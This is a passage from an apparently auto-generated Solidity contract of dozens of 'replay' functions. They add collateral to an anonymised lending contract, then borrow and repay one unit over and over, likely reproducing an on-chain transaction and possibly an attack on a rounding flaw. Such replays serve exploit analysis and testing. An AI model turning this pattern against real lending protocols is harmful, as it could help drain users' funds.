        _replayProtocolCal92();
        _replayProtocolCal93();
        _replayProtocolCal94();
    }

    function _replayProtocolCal95() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).addCollateral(address(this), true, 100);
    }

    function _replayProtocolCal96() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), 1);
    }

    function _replayProtocolCal97() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), 1);
    }

    function _replayProtocolCal98() internal {
        IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, 1);
    }

    function _replayProtocolCal99() internal {
        {
            uint256 a7259e16a90BorrowAmount = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount);
        }
    }

    function _replayProtocolCalls15() internal {
        {
            uint256 a7259e16a90RepayAmount = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount);
        }
    }

    function _replayProtocolCalls16() internal {
        {
            uint256 a7259e16a90BorrowAmount_2 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_2);
        }
    }

    function _replayProtocolCalls17() internal {
        {
            uint256 a7259e16a90RepayAmount_2 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_2);
        }
    }

    function _replayProtocolCalls18() internal {
        {
            uint256 a7259e16a90BorrowAmount_3 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_3);
        }
    }

    function _replayProtocolCalls19() internal {
        {
            uint256 a7259e16a90RepayAmount_3 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_3);
        }
    }

    function _replayProtocolCalls20() internal {
        {
            uint256 a7259e16a90BorrowAmount_4 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_4);
        }
    }

    function _replayProtocolCalls21() internal {
        {
            uint256 a7259e16a90RepayAmount_4 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_4);
        }
    }

    function _replayProtocolCalls22() internal {
        {
            uint256 a7259e16a90BorrowAmount_5 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_5);
        }
    }

    function _replayProtocolCalls23() internal {
        {
            uint256 a7259e16a90RepayAmount_5 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_5);
        }
    }

    function _replayProtocolCalls24() internal {
        {
            uint256 a7259e16a90BorrowAmount_6 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_6);
        }
    }

    function _replayProtocolCalls25() internal {
        {
            uint256 a7259e16a90RepayAmount_6 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_6);
        }
    }

    function _replayProtocolCalls26() internal {
        {
            uint256 a7259e16a90BorrowAmount_7 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_7);
        }
    }

    function _replayProtocolCalls27() internal {
        {
            uint256 a7259e16a90RepayAmount_7 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_7);
        }
    }

    function _replayProtocolCalls28() internal {
        {
            uint256 a7259e16a90BorrowAmount_8 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_8);
        }
    }

    function _replayProtocolCalls29() internal {
        {
            uint256 a7259e16a90RepayAmount_8 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_8);
        }
    }

    function _replayProtocolCalls30() internal {
        {
            uint256 a7259e16a90BorrowAmount_9 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_9);
        }
    }

    function _replayProtocolCalls31() internal {
        {
            uint256 a7259e16a90RepayAmount_9 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_9);
        }
    }

    function _replayProtocolCalls32() internal {
        {
            uint256 a7259e16a90BorrowAmount_10 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_10);
        }
    }

    function _replayProtocolCalls33() internal {
        {
            uint256 a7259e16a90RepayAmount_10 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_10);
        }
    }

    function _replayProtocolCalls34() internal {
        {
            uint256 a7259e16a90BorrowAmount_11 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_11);
        }
    }

    function _replayProtocolCalls35() internal {
        {
            uint256 a7259e16a90RepayAmount_11 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_11);
        }
    }

    function _replayProtocolCalls36() internal {
        {
            uint256 a7259e16a90BorrowAmount_12 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_12);
        }
    }

    function _replayProtocolCalls37() internal {
        {
            uint256 a7259e16a90RepayAmount_12 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_12);
        }
    }

    function _replayProtocolCalls38() internal {
        {
            uint256 a7259e16a90BorrowAmount_13 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_13);
        }
    }

    function _replayProtocolCalls39() internal {
        {
            uint256 a7259e16a90RepayAmount_13 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_13);
        }
    }

    function _replayProtocolCalls40() internal {
        {
            uint256 a7259e16a90BorrowAmount_14 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_14);
        }
    }

    function _replayProtocolCalls41() internal {
        {
            uint256 a7259e16a90RepayAmount_14 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_14);
        }
    }

    function _replayProtocolCalls42() internal {
        {
            uint256 a7259e16a90BorrowAmount_15 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_15);
        }
    }

    function _replayProtocolCalls43() internal {
        {
            uint256 a7259e16a90RepayAmount_15 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_15);
        }
    }

    function _replayProtocolCalls44() internal {
        {
            uint256 a7259e16a90BorrowAmount_16 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_16);
        }
    }

    function _replayProtocolCalls45() internal {
        {
            uint256 a7259e16a90RepayAmount_16 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_16);
        }
    }

    function _replayProtocolCalls46() internal {
        {
            uint256 a7259e16a90BorrowAmount_17 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_17);
        }
    }

    function _replayProtocolCalls47() internal {
        {
            uint256 a7259e16a90RepayAmount_17 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_17);
        }
    }

    function _replayProtocolCalls48() internal {
        {
            uint256 a7259e16a90BorrowAmount_18 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_18);
        }
    }

    function _replayProtocolCalls49() internal {
        {
            uint256 a7259e16a90RepayAmount_18 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_18);
        }
    }

    function _replayProtocolCalls50() internal {
        {
            uint256 a7259e16a90BorrowAmount_19 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_19);
        }
    }

    function _replayProtocolCalls51() internal {
        {
            uint256 a7259e16a90RepayAmount_19 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_19);
        }
    }

    function _replayProtocolCalls52() internal {
        {
            uint256 a7259e16a90BorrowAmount_20 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_20);
        }
    }

    function _replayProtocolCalls53() internal {
        {
            uint256 a7259e16a90RepayAmount_20 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_20);
        }
    }

    function _replayProtocolCalls54() internal {
        {
            uint256 a7259e16a90BorrowAmount_21 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_21);
        }
    }

    function _replayProtocolCalls55() internal {
        {
            uint256 a7259e16a90RepayAmount_21 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_21);
        }
    }

    function _replayProtocolCalls56() internal {
        {
            uint256 a7259e16a90BorrowAmount_22 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_22);
        }
    }

    function _replayProtocolCalls57() internal {
        {
            uint256 a7259e16a90RepayAmount_22 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_22);
        }
    }

    function _replayProtocolCalls58() internal {
        {
            uint256 a7259e16a90BorrowAmount_23 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_23);
        }
    }

    function _replayProtocolCalls59() internal {
        {
            uint256 a7259e16a90RepayAmount_23 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_23);
        }
    }

    function _replayProtocolCalls60() internal {
        {
            uint256 a7259e16a90BorrowAmount_24 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_24);
        }
    }

    function _replayProtocolCalls61() internal {
        {
            uint256 a7259e16a90RepayAmount_24 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_24);
        }
    }

    function _replayProtocolCalls62() internal {
        {
            uint256 a7259e16a90BorrowAmount_25 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_25);
        }
    }

    function _replayProtocolCalls63() internal {
        {
            uint256 a7259e16a90RepayAmount_25 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_25);
        }
    }

    function _replayProtocolCalls64() internal {
        {
            uint256 a7259e16a90BorrowAmount_26 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_26);
        }
    }

    function _replayProtocolCalls65() internal {
        {
            uint256 a7259e16a90RepayAmount_26 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_26);
        }
    }

    function _replayProtocolCalls66() internal {
        {
            uint256 a7259e16a90BorrowAmount_27 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_27);
        }
    }

    function _replayProtocolCalls67() internal {
        {
            uint256 a7259e16a90RepayAmount_27 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_27);
        }
    }

    function _replayProtocolCalls68() internal {
        {
            uint256 a7259e16a90BorrowAmount_28 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_28);
        }
    }

    function _replayProtocolCalls69() internal {
        {
            uint256 a7259e16a90RepayAmount_28 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_28);
        }
    }

    function _replayProtocolCalls70() internal {
        {
            uint256 a7259e16a90BorrowAmount_29 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_29);
        }
    }

    function _replayProtocolCalls71() internal {
        {
            uint256 a7259e16a90RepayAmount_29 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_29);
        }
    }

    function _replayProtocolCalls72() internal {
        {
            uint256 a7259e16a90BorrowAmount_30 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_30);
        }
    }

    function _replayProtocolCalls73() internal {
        {
            uint256 a7259e16a90RepayAmount_30 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_30);
        }
    }

    function _replayProtocolCalls74() internal {
        {
            uint256 a7259e16a90BorrowAmount_31 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_31);
        }
    }

    function _replayProtocolCalls75() internal {
        {
            uint256 a7259e16a90RepayAmount_31 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_31);
        }
    }

    function _replayProtocolCalls76() internal {
        {
            uint256 a7259e16a90BorrowAmount_32 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_32);
        }
    }

    function _replayProtocolCalls77() internal {
        {
            uint256 a7259e16a90RepayAmount_32 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_32);
        }
    }

    function _replayProtocolCalls78() internal {
        {
            uint256 a7259e16a90BorrowAmount_33 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_33);
        }
    }

    function _replayProtocolCalls79() internal {
        {
            uint256 a7259e16a90RepayAmount_33 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_33);
        }
    }

    function _replayProtocolCalls80() internal {
        {
            uint256 a7259e16a90BorrowAmount_34 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_34);
        }
    }

    function _replayProtocolCalls81() internal {
        {
            uint256 a7259e16a90RepayAmount_34 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_34);
        }
    }

    function _replayProtocolCalls82() internal {
        {
            uint256 a7259e16a90BorrowAmount_35 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_35);
        }
    }

    function _replayProtocolCalls83() internal {
        {
            uint256 a7259e16a90RepayAmount_35 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_35);
        }
    }

    function _replayProtocolCalls84() internal {
        {
            uint256 a7259e16a90BorrowAmount_36 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_36);
        }
    }

    function _replayProtocolCalls85() internal {
        {
            uint256 a7259e16a90RepayAmount_36 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_36);
        }
    }

    function _replayProtocolCalls86() internal {
        {
            uint256 a7259e16a90BorrowAmount_37 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_37);
        }
    }

    function _replayProtocolCalls87() internal {
        {
            uint256 a7259e16a90RepayAmount_37 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_37);
        }
    }

    function _replayProtocolCalls88() internal {
        {
            uint256 a7259e16a90BorrowAmount_38 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_38);
        }
    }

    function _replayProtocolCalls89() internal {
        {
            uint256 a7259e16a90RepayAmount_38 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_38);
        }
    }

    function _replayProtocolCalls90() internal {
        {
            uint256 a7259e16a90BorrowAmount_39 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_39);
        }
    }

    function _replayProtocolCalls91() internal {
        {
            uint256 a7259e16a90RepayAmount_39 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_39);
        }
    }

    function _replayProtocolCalls92() internal {
        {
            uint256 a7259e16a90BorrowAmount_40 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_40);
        }
    }

    function _replayProtocolCalls93() internal {
        {
            uint256 a7259e16a90RepayAmount_40 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_40);
        }
    }

    function _replayProtocolCalls94() internal {
        {
            uint256 a7259e16a90BorrowAmount_41 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_41);
        }
    }

    function _replayProtocolCalls95() internal {
        {
            uint256 a7259e16a90RepayAmount_41 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_41);
        }
    }

    function _replayProtocolCalls96() internal {
        {
            uint256 a7259e16a90BorrowAmount_42 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_42);
        }
    }

    function _replayProtocolCalls97() internal {
        {
            uint256 a7259e16a90RepayAmount_42 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_42);
        }
    }

    function _replayProtocolCalls98() internal {
        {
            uint256 a7259e16a90BorrowAmount_43 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_43);
        }
    }

    function _replayProtocolCalls99() internal {
        {
            uint256 a7259e16a90RepayAmount_43 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_43);
        }
    }

    function _replayProtocolCal2() internal {
        {
            uint256 a7259e16a90BorrowAmount_44 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_44);
        }
    }

    function _replayProtocolCal3() internal {
        {
            uint256 a7259e16a90RepayAmount_44 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_44);
        }
    }

    function _replayProtocolCal4() internal {
        {
            uint256 a7259e16a90BorrowAmount_45 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_45);
        }
    }

    function _replayProtocolCal5() internal {
        {
            uint256 a7259e16a90RepayAmount_45 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_45);
        }
    }

    function _replayProtocolCal6() internal {
        {
            uint256 a7259e16a90BorrowAmount_46 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_46);
        }
    }

    function _replayProtocolCal7() internal {
        {
            uint256 a7259e16a90RepayAmount_46 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_46);
        }
    }

    function _replayProtocolCal8() internal {
        {
            uint256 a7259e16a90BorrowAmount_47 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_47);
        }
    }

    function _replayProtocolCal9() internal {
        {
            uint256 a7259e16a90RepayAmount_47 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_47);
        }
    }

    function _replayProtocolCal10() internal {
        {
            uint256 a7259e16a90BorrowAmount_48 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_48);
        }
    }

    function _replayProtocolCal11() internal {
        {
            uint256 a7259e16a90RepayAmount_48 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_48);
        }
    }

    function _replayProtocolCal12() internal {
        {
            uint256 a7259e16a90BorrowAmount_49 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_49);
        }
    }

    function _replayProtocolCal13() internal {
        {
            uint256 a7259e16a90RepayAmount_49 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_49);
        }
    }

    function _replayProtocolCal14() internal {
        {
            uint256 a7259e16a90BorrowAmount_50 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_50);
        }
    }

    function _replayProtocolCal15() internal {
        {
            uint256 a7259e16a90RepayAmount_50 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_50);
        }
    }

    function _replayProtocolCal16() internal {
        {
            uint256 a7259e16a90BorrowAmount_51 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_51);
        }
    }

    function _replayProtocolCal17() internal {
        {
            uint256 a7259e16a90RepayAmount_51 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_51);
        }
    }

    function _replayProtocolCal18() internal {
        {
            uint256 a7259e16a90BorrowAmount_52 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_52);
        }
    }

    function _replayProtocolCal19() internal {
        {
            uint256 a7259e16a90RepayAmount_52 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_52);
        }
    }

    function _replayProtocolCal20() internal {
        {
            uint256 a7259e16a90BorrowAmount_53 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_53);
        }
    }

    function _replayProtocolCal21() internal {
        {
            uint256 a7259e16a90RepayAmount_53 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_53);
        }
    }

    function _replayProtocolCal22() internal {
        {
            uint256 a7259e16a90BorrowAmount_54 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_54);
        }
    }

    function _replayProtocolCal23() internal {
        {
            uint256 a7259e16a90RepayAmount_54 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_54);
        }
    }

    function _replayProtocolCal24() internal {
        {
            uint256 a7259e16a90BorrowAmount_55 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_55);
        }
    }

    function _replayProtocolCal25() internal {
        {
            uint256 a7259e16a90RepayAmount_55 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_55);
        }
    }

    function _replayProtocolCal26() internal {
        {
            uint256 a7259e16a90BorrowAmount_56 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_56);
        }
    }

    function _replayProtocolCal27() internal {
        {
            uint256 a7259e16a90RepayAmount_56 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_56);
        }
    }

    function _replayProtocolCal28() internal {
        {
            uint256 a7259e16a90BorrowAmount_57 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_57);
        }
    }

    function _replayProtocolCal29() internal {
        {
            uint256 a7259e16a90RepayAmount_57 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_57);
        }
    }

    function _replayProtocolCal30() internal {
        {
            uint256 a7259e16a90BorrowAmount_58 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_58);
        }
    }

    function _replayProtocolCal31() internal {
        {
            uint256 a7259e16a90RepayAmount_58 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_58);
        }
    }

    function _replayProtocolCal32() internal {
        {
            uint256 a7259e16a90BorrowAmount_59 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_59);
        }
    }

    function _replayProtocolCal33() internal {
        {
            uint256 a7259e16a90RepayAmount_59 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_59);
        }
    }

    function _replayProtocolCal34() internal {
        {
            uint256 a7259e16a90BorrowAmount_60 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_60);
        }
    }

    function _replayProtocolCal35() internal {
        {
            uint256 a7259e16a90RepayAmount_60 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_60);
        }
    }

    function _replayProtocolCal36() internal {
        {
            uint256 a7259e16a90BorrowAmount_61 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_61);
        }
    }

    function _replayProtocolCal37() internal {
        {
            uint256 a7259e16a90RepayAmount_61 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_61);
        }
    }

    function _replayProtocolCal38() internal {
        {
            uint256 a7259e16a90BorrowAmount_62 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_62);
        }
    }

    function _replayProtocolCal39() internal {
        {
            uint256 a7259e16a90RepayAmount_62 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_62);
        }
    }

    function _replayProtocolCal40() internal {
        {
            uint256 a7259e16a90BorrowAmount_63 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_63);
        }
    }

    function _replayProtocolCal41() internal {
        {
            uint256 a7259e16a90RepayAmount_63 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_63);
        }
    }

    function _replayProtocolCal42() internal {
        {
            uint256 a7259e16a90BorrowAmount_64 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_64);
        }
    }

    function _replayProtocolCal43() internal {
        {
            uint256 a7259e16a90RepayAmount_64 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_64);
        }
    }

    function _replayProtocolCal44() internal {
        {
            uint256 a7259e16a90BorrowAmount_65 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_65);
        }
    }

    function _replayProtocolCal45() internal {
        {
            uint256 a7259e16a90RepayAmount_65 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_65);
        }
    }

    function _replayProtocolCal46() internal {
        {
            uint256 a7259e16a90BorrowAmount_66 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_66);
        }
    }

    function _replayProtocolCal47() internal {
        {
            uint256 a7259e16a90RepayAmount_66 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_66);
        }
    }

    function _replayProtocolCal48() internal {
        {
            uint256 a7259e16a90BorrowAmount_67 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).borrow(address(this), a7259e16a90BorrowAmount_67);
        }
    }

    function _replayProtocolCal49() internal {
        {
            uint256 a7259e16a90RepayAmount_67 = 1;
            IContract_7259E1_6A90(Addresses.A_7259E1_6A90).repay(address(this), true, a7259e16a90RepayAmount_67);
        }
    }

    function _replayProtocolCal50() internal {
        {
            uint256 a7259e16a90BorrowAmount_68 = 1;
